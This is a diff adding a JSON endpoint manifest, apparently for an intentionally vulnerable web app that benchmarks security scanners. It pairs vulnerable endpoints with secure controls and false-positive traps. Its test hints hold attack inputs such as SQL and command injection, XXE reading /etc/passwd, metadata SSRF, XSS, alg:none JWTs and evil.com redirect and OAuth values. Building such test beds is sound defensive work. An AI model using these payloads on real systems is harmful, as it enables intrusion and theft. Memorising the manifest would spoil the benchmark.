@@ -1,0 +1,2222 @@
+[
+  {
+    "id": "INJ-SQLI-01",
+    "method": "GET",
+    "path": "/injection/sqli",
+    "category": "A03-Injection",
+    "vuln_type": "SQL Injection (error-based)",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/sqli?id=1' OR '1'='1",
+    "severity": "high"
+  },
+  {
+    "id": "INJ-SQLI-01-SECURE",
+    "method": "GET",
+    "path": "/injection/sqli-secure",
+    "category": "A03-Injection",
+    "vuln_type": "SQLi secure control",
+    "expectation": "secure",
+    "test_hint": "/injection/sqli-secure?id=1' OR '1'='1",
+    "severity": "info"
+  },
+  {
+    "id": "INJ-AUTH-BYPASS-01",
+    "method": "POST",
+    "path": "/injection/login",
+    "category": "A03-Injection",
+    "vuln_type": "Auth Bypass via SQLi",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/login (username: admin' OR '1'='1 --)",
+    "severity": "critical"
+  },
+  {
+    "id": "INJ-AUTH-BYPASS-01-SECURE",
+    "method": "POST",
+    "path": "/injection/login-secure",
+    "category": "A03-Injection",
+    "vuln_type": "Login secure control",
+    "expectation": "secure",
+    "test_hint": "/injection/login-secure",
+    "severity": "info"
+  },
+  {
+    "id": "INJ-NOSQLI-01",
+    "method": "GET",
+    "path": "/injection/nosqli",
+    "category": "A03-Injection",
+    "vuln_type": "NoSQL Injection",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/nosqli?user[$ne]=x",
+    "severity": "high"
+  },
+  {
+    "id": "INJ-CMDI-01",
+    "method": "GET",
+    "path": "/injection/cmdi",
+    "category": "A03-Injection",
+    "vuln_type": "OS Command Injection (mock)",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/cmdi?host=8.8.8.8;whoami",
+    "severity": "critical"
+  },
+  {
+    "id": "INJ-CMDI-01-SECURE",
+    "method": "GET",
+    "path": "/injection/cmdi-secure",
+    "category": "A03-Injection",
+    "vuln_type": "CMDi secure control",
+    "expectation": "secure",
+    "test_hint": "/injection/cmdi-secure?host=8.8.8.8;whoami",
+    "severity": "info"
+  },
+  {
+    "id": "INJ-SSTI-01",
+    "method": "GET",
+    "path": "/injection/ssti",
+    "category": "A03-Injection",
+    "vuln_type": "SSTI (mock)",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/ssti?name={{7*7}}",
+    "severity": "high"
+  },
+  {
+    "id": "INJ-LDAP-01",
+    "method": "GET",
+    "path": "/injection/ldap",
+    "category": "A03-Injection",
+    "vuln_type": "LDAP Injection",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/ldap?user=*)(uid=*))(|(uid=*",
+    "severity": "medium"
+  },
+  {
+    "id": "INJ-XPATH-01",
+    "method": "GET",
+    "path": "/injection/xpath",
+    "category": "A03-Injection",
+    "vuln_type": "XPath Injection",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/xpath?user=' or '1'='1",
+    "severity": "medium"
+  },
+  {
+    "id": "INJ-XXE-01",
+    "method": "POST",
+    "path": "/injection/xxe",
+    "category": "A03-Injection",
+    "vuln_type": "XXE",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/xxe (<!ENTITY xxe SYSTEM 'file:///etc/passwd'>)",
+    "severity": "high"
+  },
+  {
+    "id": "INJ-CRLF-01",
+    "method": "GET",
+    "path": "/injection/crlf",
+    "category": "A03-Injection",
+    "vuln_type": "CRLF/Header Injection",
+    "expectation": "vulnerable",
+    "test_hint": "/injection/crlf?name=test%0d%0aX-Injected:1",
+    "severity": "medium"
+  },
+  {
+    "id": "XSS-REFL-01",
+    "method": "GET",
+    "path": "/xss/reflected",
+    "category": "A03-XSS",
+    "vuln_type": "Reflected XSS",
+    "expectation": "vulnerable",
+    "test_hint": "/xss/reflected?name=<script>alert(1)</script>",
+    "severity": "high"
+  },
+  {
+    "id": "XSS-REFL-01-SECURE",
+    "method": "GET",
+    "path": "/xss/reflected-secure",
+    "category": "A03-XSS",
+    "vuln_type": "Reflected XSS secure control",
+    "expectation": "secure",
+    "test_hint": "/xss/reflected-secure?name=<script>alert(1)</script>",
+    "severity": "info"
+  },
+  {
+    "id": "XSS-STORED-01",
+    "method": "GET",
+    "path": "/xss/stored",
+    "category": "A03-XSS",
+    "vuln_type": "Stored XSS",
+    "expectation": "vulnerable",
+    "test_hint": "/xss/stored (POST text=<img src=x onerror=alert(1)>)",
+    "severity": "high"
+  },
+  {
+    "id": "XSS-STORED-01-SECURE",
+    "method": "GET",
+    "path": "/xss/stored-secure",
+    "category": "A03-XSS",
+    "vuln_type": "Stored XSS secure control",
+    "expectation": "secure",
+    "test_hint": "/xss/stored-secure",
+    "severity": "info"
+  },
+  {
+    "id": "XSS-DOM-01",
+    "method": "GET",
+    "path": "/xss/dom",
+    "category": "A03-XSS",
+    "vuln_type": "DOM XSS (innerHTML sink)",
+    "expectation": "vulnerable",
+    "test_hint": "/xss/dom?default=<img src=x onerror=alert(1)>",
+    "severity": "medium"
+  },
+  {
+    "id": "XSS-DOM-01-SECURE",
+    "method": "GET",
+    "path": "/xss/dom-secure",
+    "category": "A03-XSS",
+    "vuln_type": "DOM XSS secure control",
+    "expectation": "secure",
+    "test_hint": "/xss/dom-secure?default=<img src=x onerror=alert(1)>",
+    "severity": "info"
+  },
+  {
+    "id": "AC-IDOR-01",
+    "method": "GET",
+    "path": "/access/idor",
+    "category": "A01-AccessControl",
+    "vuln_type": "IDOR",
+    "expectation": "vulnerable",
+    "test_hint": "/access/idor?user_id=99",
+    "severity": "high"
+  },
+  {
+    "id": "AC-IDOR-01-SECURE",
+    "method": "GET",
+    "path": "/access/idor-secure",
+    "category": "A01-AccessControl",
+    "vuln_type": "IDOR secure control",
+    "expectation": "secure",
+    "test_hint": "/access/idor-secure?as=1&user_id=99",
+    "severity": "info"
+  },
+  {
+    "id": "AC-TRAV-01",
+    "method": "GET",
+    "path": "/access/traversal",
+    "category": "A01-AccessControl",
+    "vuln_type": "Path Traversal",
+    "expectation": "vulnerable",
+    "test_hint": "/access/traversal?file=../../secrets.txt",
+    "severity": "high"
+  },
+  {
+    "id": "AC-TRAV-01-SECURE",
+    "method": "GET",
+    "path": "/access/traversal-secure",
+    "category": "A01-AccessControl",
+    "vuln_type": "Traversal secure control",
+    "expectation": "secure",
+    "test_hint": "/access/traversal-secure?file=../../secrets.txt",
+    "severity": "info"
+  },
+  {
+    "id": "AC-FORCED-01",
+    "method": "GET",
+    "path": "/access/admin",
+    "category": "A01-AccessControl",
+    "vuln_type": "Forced Browsing",
+    "expectation": "vulnerable",
+    "test_hint": "/access/admin",
+    "severity": "medium"
+  },
+  {
+    "id": "AC-FORCED-01-SECURE",
+    "method": "GET",
+    "path": "/access/admin-secure",
+    "category": "A01-AccessControl",
+    "vuln_type": "Forced browsing secure control",
+    "expectation": "secure",
+    "test_hint": "/access/admin-secure",
+    "severity": "info"
+  },
+  {
+    "id": "REDIR-01",
+    "method": "GET",
+    "path": "/ssrf/redirect",
+    "category": "A01-AccessControl",
+    "vuln_type": "Open Redirect",
+    "expectation": "vulnerable",
+    "test_hint": "/ssrf/redirect?next=https://evil.com",
+    "severity": "medium"
+  },
+  {
+    "id": "REDIR-01-SECURE",
+    "method": "GET",
+    "path": "/ssrf/redirect-secure",
+    "category": "A01-AccessControl",
+    "vuln_type": "Redirect secure control",
+    "expectation": "secure",
+    "test_hint": "/ssrf/redirect-secure?next=https://evil.com",
+    "severity": "info"
+  },
+  {
+    "id": "CSRF-01",
+    "method": "GET",
+    "path": "/csrf/transfer",
+    "category": "A01-AccessControl",
+    "vuln_type": "CSRF (GET state-change)",
+    "expectation": "vulnerable",
+    "test_hint": "/csrf/transfer?to=evil&amount=1000",
+    "severity": "medium"
+  },
+  {
+    "id": "CSRF-01-SECURE",
+    "method": "POST",
+    "path": "/csrf/transfer-secure",
+    "category": "A01-AccessControl",
+    "vuln_type": "CSRF secure control",
+    "expectation": "secure",
+    "test_hint": "/csrf/transfer-secure (token gerekli)",
+    "severity": "info"
+  },
+  {
+    "id": "AUTH-JWT-01",
+    "method": "GET",
+    "path": "/auth/jwt-none",
+    "category": "A07-Auth",
+    "vuln_type": "JWT alg:none",
+    "expectation": "vulnerable",
+    "test_hint": "/auth/jwt-none?token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
+    "severity": "high"
+  },
+  {
+    "id": "AUTH-JWT-01-SECURE",
+    "method": "GET",
+    "path": "/auth/jwt-secure",
+    "category": "A07-Auth",
+    "vuln_type": "JWT secure control",
+    "expectation": "secure",
+    "test_hint": "/auth/jwt-secure?token=<hs256>",
+    "severity": "info"
+  },
+  {
+    "id": "AUTH-RESET-01",
+    "method": "GET",
+    "path": "/auth/reset",
+    "category": "A07-Auth",
+    "vuln_type": "Predictable reset token",
+    "expectation": "vulnerable",
+    "test_hint": "/auth/reset?user=alice&token=1234",
+    "severity": "medium"
+  },
+  {
+    "id": "AUTH-BRUTE-01",
+    "method": "POST",
+    "path": "/auth/bruteforce",
+    "category": "A07-Auth",
+    "vuln_type": "No rate limiting",
+    "expectation": "vulnerable",
+    "test_hint": "/auth/bruteforce (çoklu POST)",
+    "severity": "medium"
+  },
+  {
+    "id": "AUTH-SESS-01",
+    "method": "GET",
+    "path": "/auth/session-fixation",
+    "category": "A07-Auth",
+    "vuln_type": "Session Fixation",
+    "expectation": "vulnerable",
+    "test_hint": "/auth/session-fixation?sid=abc",
+    "severity": "medium"
+  },
+  {
+    "id": "CRYPTO-PAN-01",
+    "method": "GET",
+    "path": "/crypto/creditcard",
+    "category": "A02-Crypto",
+    "vuln_type": "Cleartext PAN",
+    "expectation": "vulnerable",
+    "test_hint": "/crypto/creditcard?user=1",
+    "severity": "high"
+  },
+  {
+    "id": "CRYPTO-PAN-01-SECURE",
+    "method": "GET",
+    "path": "/crypto/creditcard-secure",
+    "category": "A02-Crypto",
+    "vuln_type": "PAN masked control",
+    "expectation": "secure",
+    "test_hint": "/crypto/creditcard-secure?user=1",
+    "severity": "info"
+  },
+  {
+    "id": "CRYPTO-DEBUG-01",
+    "method": "GET",
+    "path": "/crypto/debug",
+    "category": "A02-Crypto",
+    "vuln_type": "Debug env leak",
+    "expectation": "vulnerable",
+    "test_hint": "/crypto/debug?debug=true",
+    "severity": "medium"
+  },
+  {
+    "id": "CRYPTO-GIT-01",
+    "method": "GET",
+    "path": "/crypto/.git/config",
+    "category": "A02-Crypto",
+    "vuln_type": "Exposed .git",
+    "expectation": "vulnerable",
+    "test_hint": "/crypto/.git/config",
+    "severity": "medium"
+  },
+  {
+    "id": "CRYPTO-HASH-01",
+    "method": "GET",
+    "path": "/crypto/hash",
+    "category": "A02-Crypto",
+    "vuln_type": "Weak hash MD5",
+    "expectation": "vulnerable",
+    "test_hint": "/crypto/hash?password=123456",
+    "severity": "low"
+  },
+  {
+    "id": "MIS-HDR-01",
+    "method": "GET",
+    "path": "/misconfig/headers",
+    "category": "A05-Misconfig",
+    "vuln_type": "Missing security headers",
+    "expectation": "vulnerable",
+    "test_hint": "/misconfig/headers",
+    "severity": "low"
+  },
+  {
+    "id": "MIS-HDR-01-SECURE",
+    "method": "GET",
+    "path": "/misconfig/headers-secure",
+    "category": "A05-Misconfig",
+    "vuln_type": "Headers secure control",
+    "expectation": "secure",
+    "test_hint": "/misconfig/headers-secure",
+    "severity": "info"
+  },
+  {
+    "id": "MIS-ERR-01",
+    "method": "GET",
+    "path": "/misconfig/error",
+    "category": "A05-Misconfig",
+    "vuln_type": "Verbose error",
+    "expectation": "vulnerable",
+    "test_hint": "/misconfig/error?cause=sql",
+    "severity": "low"
+  },
+  {
+    "id": "MIS-ERR-01-SECURE",
+    "method": "GET",
+    "path": "/misconfig/error-secure",
+    "category": "A05-Misconfig",
+    "vuln_type": "Generic error control",
+    "expectation": "secure",
+    "test_hint": "/misconfig/error-secure",
+    "severity": "info"
+  },
+  {
+    "id": "MIS-DIR-01",
+    "method": "GET",
+    "path": "/misconfig/dir-listing/",
+    "category": "A05-Misconfig",
+    "vuln_type": "Directory listing + .env",
+    "expectation": "vulnerable",
+    "test_hint": "/misconfig/dir-listing/",
+    "severity": "medium"
+  },
+  {
+    "id": "MIS-DEFAULT-01",
+    "method": "GET",
+    "path": "/misconfig/default-creds",
+    "category": "A05-Misconfig",
+    "vuln_type": "Default credentials surface",
+    "expectation": "vulnerable",
+    "test_hint": "/misconfig/default-creds",
+    "severity": "medium"
+  },
+  {
+    "id": "CORS-01",
+    "method": "GET",
+    "path": "/cors/cors",
+    "category": "A05-Misconfig",
+    "vuln_type": "CORS * + credentials",
+    "expectation": "vulnerable",
+    "test_hint": "/cors/cors",
+    "severity": "medium"
+  },
+  {
+    "id": "CORS-01-SECURE",
+    "method": "GET",
+    "path": "/cors/cors-secure",
+    "category": "A05-Misconfig",
+    "vuln_type": "CORS secure control",
+    "expectation": "secure",
+    "test_hint": "/cors/cors-secure",
+    "severity": "info"
+  },
+  {
+    "id": "CLICK-01",
+    "method": "GET",
+    "path": "/logic/clickjack",
+    "category": "A05-Misconfig",
+    "vuln_type": "Clickjacking (no XFO)",
+    "expectation": "vulnerable",
+    "test_hint": "/logic/clickjack",
+    "severity": "low"
+  },
+  {
+    "id": "SSRF-01",
+    "method": "GET",
+    "path": "/ssrf",
+    "category": "A10-SSRF",
+    "vuln_type": "SSRF (mock)",
+    "expectation": "vulnerable",
+    "test_hint": "/ssrf?url=http://169.254.169.254/latest/meta-data/",
+    "severity": "high"
+  },
+  {
+    "id": "SSRF-01-SECURE",
+    "method": "GET",
+    "path": "/ssrf/secure",
+    "category": "A10-SSRF",
+    "vuln_type": "SSRF secure control",
+    "expectation": "secure",
+    "test_hint": "/ssrf/secure?url=http://169.254.169.254/",
+    "severity": "info"
+  },
+  {
+    "id": "UPL-01",
+    "method": "POST",
+    "path": "/logic/upload",
+    "category": "A04-InsecureDesign",
+    "vuln_type": "Unrestricted upload",
+    "expectation": "vulnerable",
+    "test_hint": "/logic/upload (X-Filename: shell.php)",
+    "severity": "high"
+  },
+  {
+    "id": "UPL-01-SECURE",
+    "method": "POST",
+    "path": "/logic/upload-secure",
+    "category": "A04-InsecureDesign",
+    "vuln_type": "Upload secure control",
+    "expectation": "secure",
+    "test_hint": "/logic/upload-secure (X-Filename: a.png)",
+    "severity": "info"
+  },
+  {
+    "id": "BIZ-01",
+    "method": "GET",
+    "path": "/logic/coupon",
+    "category": "A04-InsecureDesign",
+    "vuln_type": "Business logic (coupon reuse)",
+    "expectation": "vulnerable",
+    "test_hint": "/logic/coupon?code=HOSGELDIN10",
+    "severity": "low"
+  },
+  {
+    "id": "DESER-01",
+    "method": "POST",
+    "path": "/logic/deserialize",
+    "category": "A08-Integrity",
+    "vuln_type": "Insecure Deserialization (mock)",
+    "expectation": "vulnerable",
+    "test_hint": "/logic/deserialize ({\"rce\":\"id\"})",
+    "severity": "high"
+  },
+  {
+    "id": "FP-SEARCH-01",
+    "method": "GET",
+    "path": "/fp/search",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: 'SQL syntax' help text",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/search?q=' OR 1=1",
+    "severity": "info"
+  },
+  {
+    "id": "FP-HEALTH-01",
+    "method": "GET",
+    "path": "/fp/health",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: 'password' word in docs",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/health",
+    "severity": "info"
+  },
+  {
+    "id": "FP-VERSION-01",
+    "method": "GET",
+    "path": "/fp/version",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: version banner",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/version",
+    "severity": "info"
+  },
+  {
+    "id": "FP-ECHO-01",
+    "method": "GET",
+    "path": "/fp/profile-echo",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: encoded echo",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/profile-echo?nick=<script>alert(1)</script>",
+    "severity": "info"
+  },
+  {
+    "id": "FP-ERROR-01",
+    "method": "GET",
+    "path": "/fp/error-fake",
+    "category": "FP-Trap",
+    "vuln_type": "FP trap: generic error",
+    "expectation": "fp-trap",
+    "test_hint": "/fp/error-fake",
+    "severity": "info"
+  },
+  {
+    "id": "API-BOLA-01",
+    "method": "GET",
+    "path": "/api/users/:id",
+    "category": "API-Security",
+    "vuln_type": "BOLA: başkasının kaydı tam PII (TCKN/IBAN)",
+    "expectation": "vulnerable",
+    "test_hint": "/api/users/99",
+    "severity": "critical"
+  },
+  {
+    "id": "API-BOLA-01-SECURE",
+    "method": "GET",
+    "path": "/api/users-secure/:id",
+    "category": "API-Security",
+    "vuln_type": "BOLA secure control (sahiplik + minimal)",
+    "expectation": "secure",
+    "test_hint": "/api/users-secure/99 (Header X-User-Id: 1)",
+    "severity": "info"
+  },
+  {
+    "id": "API-MASS-01",
+    "method": "POST",
+    "path": "/api/users",
+    "category": "API-Security",
+    "vuln_type": "Mass Assignment: role client'tan",
+    "expectation": "vulnerable",
+    "test_hint": "/api/users {\"username\":\"x\",\"role\":\"admin\"}",
+    "severity": "high"
+  },
+  {
+    "id": "API-MASS-01-SECURE",
+    "method": "POST",
+    "path": "/api/users-secure",
+    "category": "API-Security",
+    "vuln_type": "Mass assignment secure (allowlist)",
+    "expectation": "secure",
+    "test_hint": "/api/users-secure {\"username\":\"x\",\"role\":\"admin\"} -> 400",
+    "severity": "info"
+  },
+  {
+    "id": "API-EXCESS-01",
+    "method": "GET",
+    "path": "/api/account",
+    "category": "API-Security",
+    "vuln_type": "Excessive Data: TCKN+IBAN+PAN (KVKK)",
+    "expectation": "vulnerable",
+    "test_hint": "/api/account?user=1",
+    "severity": "high"
+  },
+  {
+    "id": "API-EXCESS-01-SECURE",
+    "method": "GET",
+    "path": "/api/account-secure",
+    "category": "API-Security",
+    "vuln_type": "Excessive data secure (maskeli)",
+    "expectation": "secure",
+    "test_hint": "/api/account-secure?user=1",
+    "severity": "info"
+  },
+  {
+    "id": "API-RATE-01",
+    "method": "POST",
+    "path": "/api/otp-verify",
+    "category": "API-Security",
+    "vuln_type": "OTP rate-limit yok (sınırsız deneme)",
+    "expectation": "vulnerable",
+    "test_hint": "/api/otp-verify {\"code\":\"000000\"} x N",
+    "severity": "high"
+  },
+  {
+    "id": "API-RATE-01-SECURE",
+    "method": "POST",
+    "path": "/api/otp-verify-secure",
+    "category": "API-Security",
+    "vuln_type": "OTP rate-limit secure (5->kilit)",
+    "expectation": "secure",
+    "test_hint": "/api/otp-verify-secure {\"code\":\"x\"} x6 -> 429",
+    "severity": "info"
+  },
+  {
+    "id": "API-KEY-01",
+    "method": "GET",
+    "path": "/api/balance",
+    "category": "API-Security",
+    "vuln_type": "API key URL query'de (loglara düşer)",
+    "expectation": "vulnerable",
+    "test_hint": "/api/balance?api_key=live_mock_key_123",
+    "severity": "medium"
+  },
+  {
+    "id": "API-KEY-01-SECURE",
+    "method": "GET",
+    "path": "/api/balance-secure",
+    "category": "API-Security",
+    "vuln_type": "API key header-only control",
+    "expectation": "secure",
+    "test_hint": "/api/balance-secure (Header X-API-Key)",
+    "severity": "info"
+  },
+  {
+    "id": "API-PAGE-01",
+    "method": "GET",
+    "path": "/api/orders",
+    "category": "API-Security",
+    "vuln_type": "Pagination abuse (?limit=100000 dökülür)",
+    "expectation": "vulnerable",
+    "test_hint": "/api/orders?limit=100000",
+    "severity": "medium"
+  },
+  {
+    "id": "API-INVITE-01",
+    "method": "GET",
+    "path": "/api/invite",
+    "category": "API-Security",
+    "vuln_type": "Tahmin edilebilir davet token (sıralı)",
+    "expectation": "vulnerable",
+    "test_hint": "/api/invite?token=1002",
+    "severity": "medium"
+  },
+  {
+    "id": "GQL-INTROS-01",
+    "method": "POST",
+    "path": "/graphql",
+    "category": "API-GraphQL",
+    "vuln_type": "Introspection açık (şema+passwordHash sızar)",
+    "expectation": "vulnerable",
+    "test_hint": "/graphql {\"query\":\"{ __schema { queryType { name } } }\"}",
+    "severity": "medium"
+  },
+  {
+    "id": "GQL-INTROS-01-SECURE",
+    "method": "POST",
+    "path": "/graphql/secure",
+    "category": "API-GraphQL",
+    "vuln_type": "Introspection kapalı control",
+    "expectation": "secure",
+    "test_hint": "/graphql/secure introspection -> 400",
+    "severity": "info"
+  },
+  {
+    "id": "GQL-BATCH-01",
+    "method": "POST",
+    "path": "/graphql/batch",
+    "category": "API-GraphQL",
+    "vuln_type": "Batch brute-force (50 login/tek istek)",
+    "expectation": "vulnerable",
+    "test_hint": "/graphql/batch [{login}...]",
+    "severity": "high"
+  },
+  {
+    "id": "GQL-DEPTH-01",
+    "method": "POST",
+    "path": "/graphql/depth",
+    "category": "API-GraphQL",
+    "vuln_type": "Depth-limit yok (DoS, 2.4M kayıt)",
+    "expectation": "vulnerable",
+    "test_hint": "/graphql/depth nested users{orders{...}}",
+    "severity": "medium"
+  },
+  {
+    "id": "GQL-IDOR-01",
+    "method": "POST",
+    "path": "/graphql/user",
+    "category": "API-GraphQL",
+    "vuln_type": "GraphQL IDOR (auth'suz user(id:99))",
+    "expectation": "vulnerable",
+    "test_hint": "/graphql/user {\"id\":\"99\"}",
+    "severity": "high"
+  },
+  {
+    "id": "AUTHX-OTP-01",
+    "method": "POST",
+    "path": "/authx/otp",
+    "category": "A07-Auth",
+    "vuln_type": "4 haneli SMS kodu, kilit yok",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/otp {\"code\":\"0000\"} x N",
+    "severity": "high"
+  },
+  {
+    "id": "AUTHX-OTP-01-SECURE",
+    "method": "POST",
+    "path": "/authx/otp-secure",
+    "category": "A07-Auth",
+    "vuln_type": "OTP kilitli control (5->15dk)",
+    "expectation": "secure",
+    "test_hint": "/authx/otp-secure x6 -> 429",
+    "severity": "info"
+  },
+  {
+    "id": "AUTHX-MFA-01",
+    "method": "POST",
+    "path": "/authx/mfa",
+    "category": "A07-Auth",
+    "vuln_type": "MFA bypass (boş kod / mfa=skip)",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/mfa {\"user\":\"alice\"} (kodsuz)",
+    "severity": "critical"
+  },
+  {
+    "id": "AUTHX-OAUTH-01",
+    "method": "GET",
+    "path": "/authx/oauth",
+    "category": "A07-Auth",
+    "vuln_type": "OAuth redirect_uri doğrulanmıyor (kod hırsızlığı)",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/oauth?client_id=shop&redirect_uri=https://evil.com/cb&response_type=code",
+    "severity": "high"
+  },
+  {
+    "id": "AUTHX-OAUTH-01-SECURE",
+    "method": "GET",
+    "path": "/authx/oauth-secure",
+    "category": "A07-Auth",
+    "vuln_type": "OAuth allowlist control",
+    "expectation": "secure",
+    "test_hint": "/authx/oauth-secure?redirect_uri=https://evil.com/cb -> 400",
+    "severity": "info"
+  },
+  {
+    "id": "AUTHX-RESET-POISON-01",
+    "method": "GET",
+    "path": "/authx/forgot",
+    "category": "A07-Auth",
+    "vuln_type": "Reset link Host zehirlenmesi",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/forgot (Header X-Forwarded-Host: evil.com)",
+    "severity": "high"
+  },
+  {
+    "id": "AUTHX-ENUM-01",
+    "method": "POST",
+    "path": "/authx/login-enum",
+    "category": "A07-Auth",
+    "vuln_type": "Kullanıcı enumeration (404 vs 401)",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/login-enum {\"username\":\"yok\"} -> 404",
+    "severity": "medium"
+  },
+  {
+    "id": "AUTHX-ENUM-01-SECURE",
+    "method": "POST",
+    "path": "/authx/login-enum-secure",
+    "category": "A07-Auth",
+    "vuln_type": "Enum secure (generic mesaj)",
+    "expectation": "secure",
+    "test_hint": "/authx/login-enum-secure her zaman 401",
+    "severity": "info"
+  },
+  {
+    "id": "AUTHX-KID-01",
+    "method": "GET",
+    "path": "/authx/jwt-kid",
+    "category": "A07-Auth",
+    "vuln_type": "JWT kid path traversal (mock key load)",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/jwt-kid?token=<kid ../../dev.key>",
+    "severity": "high"
+  },
+  {
+    "id": "AUTHX-JKU-01",
+    "method": "GET",
+    "path": "/authx/jwt-jku",
+    "category": "A07-Auth",
+    "vuln_type": "JWT jku allowlist dışı JWK güveni",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/jwt-jku?token=<jku https://evil.com>",
+    "severity": "high"
+  },
+  {
+    "id": "AUTHX-WEAK-01",
+    "method": "GET",
+    "path": "/authx/jwt-weak",
+    "category": "A07-Auth",
+    "vuln_type": "JWT zayıf secret (secret/password)",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/jwt-weak (önce token al, sonra dene)",
+    "severity": "medium"
+  },
+  {
+    "id": "CL-PM-01",
+    "method": "GET",
+    "path": "/client/chat",
+    "category": "Client-Side",
+    "vuln_type": "postMessage XSS (origin yok + innerHTML)",
+    "expectation": "vulnerable",
+    "test_hint": "/client/chat (postMessage dinleyici)",
+    "severity": "medium"
+  },
+  {
+    "id": "CL-PM-01-SECURE",
+    "method": "GET",
+    "path": "/client/chat-secure",
+    "category": "Client-Side",
+    "vuln_type": "postMessage secure (origin+textContent)",
+    "expectation": "secure",
+    "test_hint": "/client/chat-secure",
+    "severity": "info"
+  },
+  {
+    "id": "CL-JSONP-01",
+    "method": "GET",
+    "path": "/client/jsonp",
+    "category": "Client-Side",
+    "vuln_type": "JSONP callback XSS",
+    "expectation": "vulnerable",
+    "test_hint": "/client/jsonp?callback=alert(1)//",
+    "severity": "medium"
+  },
+  {
+    "id": "CL-MD-01",
+    "method": "GET",
+    "path": "/client/notes",
+    "category": "Client-Side",
+    "vuln_type": "Markdown stored XSS (filtresiz HTML)",
+    "expectation": "vulnerable",
+    "test_hint": "/client/notes (POST md=<svg onload=alert(1)>)",
+    "severity": "high"
+  },
+  {
+    "id": "CL-MD-01-SECURE",
+    "method": "GET",
+    "path": "/client/notes-secure",
+    "category": "Client-Side",
+    "vuln_type": "Markdown sanitize control",
+    "expectation": "secure",
+    "test_hint": "/client/notes-secure",
+    "severity": "info"
+  },
+  {
+    "id": "CL-CLOBBER-01",
+    "method": "GET",
+    "path": "/client/clobber",
+    "category": "Client-Side",
+    "vuln_type": "DOM Clobbering (window.config)",
+    "expectation": "vulnerable",
+    "test_hint": "/client/clobber?html=<input name=config>",
+    "severity": "medium"
+  },
+  {
+    "id": "CL-PPOLL-01",
+    "method": "POST",
+    "path": "/client/pollute",
+    "category": "Client-Side",
+    "vuln_type": "Prototype Pollution (mock merge)",
+    "expectation": "vulnerable",
+    "test_hint": "/client/pollute {\"__proto__\":{\"isAdmin\":true}}",
+    "severity": "high"
+  },
+  {
+    "id": "CL-GOTO-01",
+    "method": "GET",
+    "path": "/client/goto",
+    "category": "Client-Side",
+    "vuln_type": "javascript:/data: redirect",
+    "expectation": "vulnerable",
+    "test_hint": "/client/goto?next=javascript:alert(1)",
+    "severity": "medium"
+  },
+  {
+    "id": "CL-GOTO-01-SECURE",
+    "method": "GET",
+    "path": "/client/goto-secure",
+    "category": "Client-Side",
+    "vuln_type": "Redirect scheme allowlist control",
+    "expectation": "secure",
+    "test_hint": "/client/goto-secure?next=javascript:alert(1) -> 400",
+    "severity": "info"
+  },
+  {
+    "id": "EXP-ENV-01",
+    "method": "GET",
+    "path": "/files/.env",
+    "category": "A05-Exposure",
+    "vuln_type": "Exposed .env (DB+AWS+Stripe mock)",
+    "expectation": "vulnerable",
+    "test_hint": "/files/.env",
+    "severity": "high"
+  },
+  {
+    "id": "EXP-BAK-01",
+    "method": "GET",
+    "path": "/files/backup.bak",
+    "category": "A05-Exposure",
+    "vuln_type": "Backup dump (.bak/.sql.bak)",
+    "expectation": "vulnerable",
+    "test_hint": "/files/backup.bak",
+    "severity": "medium"
+  },
+  {
+    "id": "EXP-DS-01",
+    "method": "GET",
+    "path": "/files/.DS_Store",
+    "category": "A05-Exposure",
+    "vuln_type": ".DS_Store dosya listesi sızar",
+    "expectation": "vulnerable",
+    "test_hint": "/files/.DS_Store",
+    "severity": "low"
+  },
+  {
+    "id": "EXP-MAP-01",
+    "method": "GET",
+    "path": "/files/app.js.map",
+    "category": "A05-Exposure",
+    "vuln_type": "Source-map secret sızıntısı",
+    "expectation": "vulnerable",
+    "test_hint": "/files/app.js.map",
+    "severity": "medium"
+  },
+  {
+    "id": "EXP-SWAG-01",
+    "method": "GET",
+    "path": "/files/swagger.json",
+    "category": "A05-Exposure",
+    "vuln_type": "Internal swagger ifşası",
+    "expectation": "vulnerable",
+    "test_hint": "/files/swagger.json",
+    "severity": "medium"
+  },
+  {
+    "id": "EXP-ACT-01",
+    "method": "GET",
+    "path": "/files/actuator",
+    "category": "A05-Exposure",
+    "vuln_type": "Actuator env ifşası (Spring)",
+    "expectation": "vulnerable",
+    "test_hint": "/files/actuator",
+    "severity": "high"
+  },
+  {
+    "id": "EXP-ROBOTS-01",
+    "method": "GET",
+    "path": "/files/robots.txt",
+    "category": "A05-Exposure",
+    "vuln_type": "robots.txt hassas yol listesi",
+    "expectation": "vulnerable",
+    "test_hint": "/files/robots.txt",
+    "severity": "low"
+  },
+  {
+    "id": "FILE-SVG-01",
+    "method": "POST",
+    "path": "/files/svg",
+    "category": "A04-FileHandling",
+    "vuln_type": "SVG upload XSS (image/svg+xml yürütülür)",
+    "expectation": "vulnerable",
+    "test_hint": "/files/svg (X-Filename: x.svg, <svg onload>)",
+    "severity": "high"
+  },
+  {
+    "id": "FILE-SVG-01-SECURE",
+    "method": "POST",
+    "path": "/files/svg-secure",
+    "category": "A04-FileHandling",
+    "vuln_type": "SVG yasak control (415)",
+    "expectation": "secure",
+    "test_hint": "/files/svg-secure (X-Filename: x.svg -> 415)",
+    "severity": "info"
+  },
+  {
+    "id": "FILE-ZIP-01",
+    "method": "POST",
+    "path": "/files/unzip",
